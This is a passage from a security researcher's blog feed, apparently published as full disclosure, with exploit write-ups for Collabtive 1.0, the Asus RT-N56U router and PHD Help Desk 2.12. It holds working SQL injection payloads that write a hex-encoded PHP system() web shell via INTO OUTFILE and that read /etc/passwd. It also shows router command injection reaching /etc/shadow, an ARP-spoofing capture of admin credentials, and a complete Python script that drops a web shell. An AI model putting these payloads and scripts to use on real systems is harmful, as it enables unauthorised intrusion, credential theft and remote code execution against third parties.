+</span><span class='line'>            $num = $conn-&gt;query($num)-&gt;fetch();
+</span><span class='line'>            $num = $num[0];
+</span><span class='line'>        } else {
+</span><span class='line'>            $num = 0;
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>
+
+<p>This can be exploited with a simple UNION query to drop a shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219/collabtive/manageuser.php?action=profile&id=1&task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&project=1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploiting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
+</span><span class='line'>[!] Dropping web shell on 192.168.1.83...
+</span><span class='line'>[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg"></p>
+
+<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Asus RT56U Remote Command Injection]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection/"/>
+    <updated>2013-06-05T23:45:20-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection</id>
+    <content type="html"><![CDATA[<p>After discovering a couple vulnerabilities in the Asus RT56U prior, I decided to check out the latest firmware and hunt around for a few more.</p>
+
+<p>I was running 3.0.0.4.342, which happens to be one version behind the latest (3.0.0.4.360), so I did a sweep of both.  I enabled telnet on the router and hunted around, which led me to an unlinked page, Main_Analysis_Content.asp.  This page hosts a slew of diagnostic tools, including the ability to ping network systems.  See where this is going?</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-4C_1Ig7iJos/UZwIsAqjHqI/AAAAAAAAAeo/hC3nnlBbyb8/s640/command_injection.jpg"></p>
+
+<p>And the related source code to this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>document.form.SystemCmd.value = "ping -c " + document.form.pingCNT.value + " " + document.form.destIP.value;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pretty trivial, and each command, ping, nslookup, and traceroute, is vulnerable.  The system is running an HTTP web server that serves up ASP pages, so we could wget and deploy a reverse ASP shell or set up a netcat listener.</p>
+
+<p>I then took a look at the latest firmware, which touts the following changes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ASUS RT-N56U Firmware Version 3.0.0.4.360
+</span><span class='line'>1. AiCloud
+</span><span class='line'>For iOS user, please upgrade app to 1.02.78 or above
+</span><span class='line'>(for more information, please refer to http://event.asus.com/2012/nw/aicloud/index.htm)
+</span><span class='line'>2. Network tools in Advanced setting
+</span><span class='line'>3. WOL user interface
+</span><span class='line'>4. H.323 and SIP passthrough can be disabled in Advanced Settings --&gt; WAN --&gt;NAT Passthrough
+</span><span class='line'>5. Click the device name and lookup the manufacturer information
+</span><span class='line'>6. Change the DHCP query frequency in Advanced settings--&gt;WAN--&gt;Internet connection to resolve the ISP compatibility issue.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it looks like the tools were added in the .342 (or earlier) firmware, but not actually linked until the .360 release.  I then flashed over the firmware to take a look at any changes.  It appeared they added a Network Tools section which, of course, allows us to:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s640/asus_exec_360.jpg"></p>
+
+<p>It&rsquo;s kind of ridiculous that we can hit /etc/shadow with this.</p>
+
+<p>As an aside, I thought about what sort of files might be accessible without authenticating to the web server.  Seeing as I had access to enumerate the file system, I constructed a listing of every file in the web server&rsquo;s root.  The code can be seen below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import urllib, urllib2
+</span><span class='line'>
+</span><span class='line'>def get_files():
+</span><span class='line'>    files = []
+</span><span class='line'>    with open('files_rt.txt', 'r') as f:
+</span><span class='line'>        files = [x.strip() for x in f.readlines()]
+</span><span class='line'>    print '[!] Built %d files to test...'%len(files)
+</span><span class='line'>    return files
+</span><span class='line'>
+</span><span class='line'>def run():
+</span><span class='line'>    files        = get_files()
+</span><span class='line'>    open_files   = []
+</span><span class='line'>
+</span><span class='line'>    for f in files:
+</span><span class='line'>        url = 'http://192.168.1.1/'+f
+</span><span class='line'>        try:
+</span><span class='line'>            data = urllib2.urlopen(url).read()
+</span><span class='line'>        except urllib2.HTTPError as e:
+</span><span class='line'>            continue
+</span><span class='line'>
+</span><span class='line'>        open_files.append(url)
+</span><span class='line'>
+</span><span class='line'>    print '[!] %d exposed files'%len(open_files)
+</span><span class='line'>    for f in open_files: print '\t[!] %s'%f
+</span><span class='line'>
+</span><span class='line'>def parse_args():
+</span><span class='line'>    pass
+</span><span class='line'>
+</span><span class='line'>if __name__ == "__main__":
+</span><span class='line'>    run()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When run, 42 files were exposed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~$ python rt56u_iter.py 
+</span><span class='line'>[!] Built 277 files to test...
+</span><span class='line'>[!] 42 exposed files
+</span><span class='line'>    [!] http://192.168.1.1/NM_style.css
+</span><span class='line'>    [!] http://192.168.1.1/Nologin.asp
+</span><span class='line'>    [!] http://192.168.1.1/PIE.htc
+</span><span class='line'>    [!] http://192.168.1.1/ParentalControl.css
+</span><span class='line'>    [!] http://192.168.1.1/WAN_info.asp
+</span><span class='line'>    [!] http://192.168.1.1/app_installation.css
+</span><span class='line'>    [!] http://192.168.1.1/detect_firmware.asp
+</span><span class='line'>    [!] http://192.168.1.1/error_page.htm
+</span><span class='line'>    [!] http://192.168.1.1/fan.svg
+</span><span class='line'>    [!] http://192.168.1.1/form_style.css
+</span><span class='line'>    [!] http://192.168.1.1/get_webdavInfo.asp
+</span><span class='line'>    [!] http://192.168.1.1/gotoHomePage.htm
+</span><span class='line'>    [!] http://192.168.1.1/httpd_check.htm
+</span><span class='line'>    [!] http://192.168.1.1/index_style.css
+</span><span class='line'>    [!] http://192.168.1.1/jquery.js
+</span><span class='line'>    [!] http://192.168.1.1/menu_style.css
+</span><span class='line'>    [!] http://192.168.1.1/other.css
+</span><span class='line'>    [!] http://192.168.1.1/pwdmeter.css
+</span><span class='line'>    [!] http://192.168.1.1/remote.asp
+</span><span class='line'>    [!] http://192.168.1.1/tm.svg
+</span><span class='line'>    [!] http://192.168.1.1/tmmenu.css
+</span><span class='line'>    [!] http://192.168.1.1/update_applist.asp
+</span><span class='line'>    [!] http://192.168.1.1/update_appstate.asp
+</span><span class='line'>    [!] http://192.168.1.1/update_cloudstatus.asp
+</span><span class='line'>    [!] http://192.168.1.1/ure_success.htm
+</span><span class='line'>    [!] http://192.168.1.1/ureip.asp
+</span><span class='line'>    [!] http://192.168.1.1/usp_style.css
+</span><span class='line'>    [!] http://192.168.1.1/aidisk/AiDisk_style.css
+</span><span class='line'>    [!] http://192.168.1.1/aidisk/aidisk.css
+</span><span class='line'>    [!] http://192.168.1.1/device-map/device-map.css
+</span><span class='line'>    [!] http://192.168.1.1/iui/Button_low.jpg
+</span><span class='line'>    [!] http://192.168.1.1/iui/check.png
+</span><span class='line'>    [!] http://192.168.1.1/iui/default-theme.css
+</span><span class='line'>    [!] http://192.168.1.1/iui/iui.css
+</span><span class='line'>    [!] http://192.168.1.1/iui/listArrow.png
+</span><span class='line'>    [!] http://192.168.1.1/iui/listArrow_setting.png
+</span><span class='line'>    [!] http://192.168.1.1/iui/toolButton.png
+</span><span class='line'>    [!] http://192.168.1.1/calendar/fullcalendar.css
+</span><span class='line'>    [!] http://192.168.1.1/svghtc/svg.htc
+</span><span class='line'>    [!] http://192.168.1.1/svghtc/svg.swf
+</span><span class='line'>    [!] http://192.168.1.1/qis/qis_style.css
+</span><span class='line'>    [!] http://192.168.1.1/qis/qis_style_m.css</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A majority of the files are pretty useless/uninteresting, such as the css/jpg/png files, but a couple of the ASP files have some interesting information.  <code>Nologin.asp</code> lets us know every address the DHCP server has leased out, as well as the IP of the currently logged in administrator.  <code>get_webdavInfo.asp</code> gives us a bunch of great info, including the firmware version, DDNS information, mode of operation, and more.</p>
+
+<p>The only really interesting page to me is <code>Nologin.asp</code>.  This gives us the currently logged in administrator; so, if we&rsquo;re on the local network, we can generate a short script that periodically pings the router and alerts us when an admin logs in.  We can then ARPP the administrator and hijack the password; this works because the router&rsquo;s web server doesn&rsquo;t do any session management, it simply uses basic HTTP auth to send the base64&rsquo;d password.</p>
+
+<p>Observe:</p>
+
+<p><img class="center" src="http://1.bp.blogspot.com/-uPMtGiHrr8c/Ua_L3lVLl9I/AAAAAAAAAf4/QIhMSOdOfvM/s640/no_login.jpg"></p>
+
+<p>Now we know where the administrator is logged in.  We can now ARPP the host and hijack the password.  It is unnecessary for the administrator to actually be doing anything, because conveniently the client&rsquo;s browser sends out an ajax request to <code>/ajax_status.asp</code> quite often, complete with authentication credentials.  Using zarp, a network attack tool designed by yours truly, we can ARPP the admin and set up a password sniffer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[Running sessions]
+</span><span class='line'>[1] ARP Spoof
+</span><span class='line'>[0] 192.168.1.219
+</span><span class='line'>[2] Password Sniffer
+</span><span class='line'>[0] 192.168.1.219
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>[1] Stop session
+</span><span class='line'>[2] View session
+</span><span class='line'>[3] Start session logger
+</span><span class='line'>[4] Stop session logger
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; 2
+</span><span class='line'>[module] [number]&gt; 2 0
+</span><span class='line'>[!] [enter] when finished
+</span><span class='line'>[!] Dumping output from 'Password Sniffer'...
+</span><span class='line'>[!] Host: 192.168.1.1
+</span><span class='line'>[!] User: admin:*********</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Immediately we catch a heartbeat and grab the password (edited out).</p>
+
+<p>Lastly, this is full disclosure.  Check out <a href="http://seclists.org/fulldisclosure/2013/Mar/126">this</a> listing for how Asus treats security researchers.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PHD Help Desk 2.12 - SQLi/XSS]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/"/>
+    <updated>2013-06-02T23:55:27-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss</id>
+    <content type="html"><![CDATA[<p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>
+
+<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$operador=trim(strip_tags($_POST[operador]));
+</span><span class='line'>$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador'";
+</span><span class='line'>$result=mysql_query($query) or die(mysql_error());
+</span><span class='line'>$q_filas=mysql_num_rows($result);
+</span><span class='line'>
+</span><span class='line'>if($q_filas!=1)
+</span><span class='line'>       {$mensaje=$Oper_not_autorized;
+</span><span class='line'>        require($Include.'login.inc');
+</span><span class='line'>        exit();
+</span><span class='line'>       }
+</span><span class='line'>
+</span><span class='line'>### Ahora verifico la contraseña
+</span><span class='line'>$md5_contrasenia=md5($_POST['contrasenia']);
+</span><span class='line'>
+</span><span class='line'>$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador' AND contrasenia='$md5_contrasenia'";
+</span><span class='line'>$result=mysql_query($query) or die (mysql_error());;
+</span><span class='line'>$q_filas=mysql_num_rows($result);
+</span><span class='line'>
+</span><span class='line'>if ($q_filas!=1)
+</span><span class='line'>             {$mensaje=$Invalid_passwd;
+</span><span class='line'>             require($Include.'login.inc');
+</span><span class='line'>             exit();
+</span><span class='line'>            }
+</span><span class='line'>
+</span><span class='line'>$data=mysql_fetch_array($result);
+</span><span class='line'>if ($data['nivel']&lt;1)
+</span><span class='line'>               {$mensaje=$Oper_not_autorized;
+</span><span class='line'>                require($Include.'login.inc');
+</span><span class='line'>                exit();
+</span><span class='line'>               }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>
+
+<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&contrasenia=asdf&submit=Enter&captcha=</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg"></p>
+
+<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~# python phd_sqli.py -h
+</span><span class='line'>usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help  show this help message and exit
+</span><span class='line'>  -i IP       server address
+</span><span class='line'>  -p ROOTP    path to login.php (/phd_2_12)
+</span><span class='line'>  -w PATH     writable web path (/var/www/phd_2_12) for shell
+</span><span class='line'>root@jali:~# python phd_sqli.py -i 192.168.1.83
+</span><span class='line'>[!] Dropping web shell on 192.168.1.83...
+</span><span class='line'>[!] Shell dropped.  http://192.168.1.83/phd_2_12/0m05k.php?rr=ls
+</span><span class='line'>root@jali:~# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>As a note, <code>strip_slashes</code> prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># &lt;? php system($_GET["rr"]); ?&gt;
+</span><span class='line'>data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
+</span><span class='line'>                                     ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
+</span><span class='line'>                                     ' \'{0}/{1}.php'.format(options.path,shell)),
+</span><span class='line'>                         'contrasenia':'pass',
+</span><span class='line'>                         'submit':'Enter',
+</span><span class='line'>                         'captcha':''})</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (isSet($_GET['file']))
+</span><span class='line'>
+</span><span class='line'>    {$query="SELECT *
+</span><span class='line'>             FROM {$MyPHD}sigo_ticket
+</span><span class='line'>             WHERE seq_sigo_ticket_id={$_GET['file']} ";
+</span><span class='line'>             
+</span><span class='line'>     $result=mysql_query($query) or die (mysql_error());
+</span><span class='line'>     
+</span><span class='line'>     $row = mysql_fetch_array($result);
+</span><span class='line'>
+</span><span class='line'>     $tipo_adjunto = $row['tipo_adjunto'];
+</span><span class='line'>     $adjunto = $row['adjunto'];
+</span><span class='line'>     $nombre_adjunto = $row['nombre_adjunto'];
+</span><span class='line'>
+</span><span class='line'>     if(strlen($nombre_adjunto)&gt;1)
+</span><span class='line'>        {header("Content-type: $tipo_adjunto");
+</span><span class='line'>         header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
+</span><span class='line'>         echo $adjunto;
+</span><span class='line'>        }
+</span><span class='line'>     else
+</span><span class='line'>        {require('head.inc');
+</span><span class='line'>         echo "&lt;div class='error'&gt;INVALID CALL &lt;/div&gt;";
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the sanitization for this (and most files, really) is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (get_magic_quotes_gpc())
+</span><span class='line'>    { foreach($_GET as $clave =&gt; $valor)
+</span><span class='line'>      {$_GET[$clave]=stripslashes($_GET[$clave]);
+</span><span class='line'>      }
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>foreach($_GET as $clave =&gt; $valor)
+</span><span class='line'>     {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
+</span><span class='line'>     }</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>
+
+<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg"></p>
+
+<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit Title: PHD Help Desk 2.12 SQLi
+</span><span class='line'># Date: 05/24/2013
+</span><span class='line'># Exploit Author: drone (@dronesec)
+</span><span class='line'># Vendor Homepage: http://www.p-hd.com.ar/
+</span><span class='line'># Software Link: http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip
+</span><span class='line'># Version: 2.12
+</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled)
+</span><span class='line'>
+</span><span class='line'>""" This app is so full of SQLi & XSS; if you're looking for
+</span><span class='line'>    practice with real web apps, this is a good place to go.
+</span><span class='line'>
+</span><span class='line'>    You don't need auth for this.
+</span><span class='line'>    @dronesec
+</span><span class='line'>"""
+</span><span class='line'>from argparse import ArgumentParser
+</span><span class='line'>import string
+</span><span class='line'>import random
+</span><span class='line'>import urllib, urllib2
+</span><span class='line'>import sys
+</span><span class='line'>
+</span><span class='line'>def run(options):
+</span><span class='line'>    print '[!] Dropping web shell on %s...'%(options.ip)
+</span><span class='line'>
+</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+</span><span class='line'>
+</span><span class='line'>    # &lt;? php system($_GET["rr"]); ?&gt;
+</span><span class='line'>    data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
+</span><span class='line'>                                    ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
+</span><span class='line'>                                        ' \'{0}/{1}.php'.format(options.path,shell)),
+</span><span class='line'>                             'contrasenia':'pass',
+</span><span class='line'>                             'submit':'Enter',
+</span><span class='line'>                             'captcha':''})
+</span><span class='line'>
+</span><span class='line'>    urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
+</span><span class='line'>    print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)
+</span><span class='line'>
+</span><span class='line'>def parse():
+</span><span class='line'>    parser = ArgumentParser()
+</span><span class='line'>    parser.add_argument('-i',help='server address',action='store',dest='ip')
+</span><span class='line'>    parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
+</span><span class='line'>                default='/phd_2_12', dest='rootp')
+</span><span class='line'>    parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
+</span><span class='line'>                default='/var/www/phd_2_12/', action='store', dest='path')
+</span><span class='line'>
+</span><span class='line'>    options = parser.parse_args()
+</span><span class='line'>    if not options.ip:
+</span><span class='line'>        parser.print_help()
+</span><span class='line'>        sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+</span><span class='line'>    options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
+</span><span class='line'>    return options
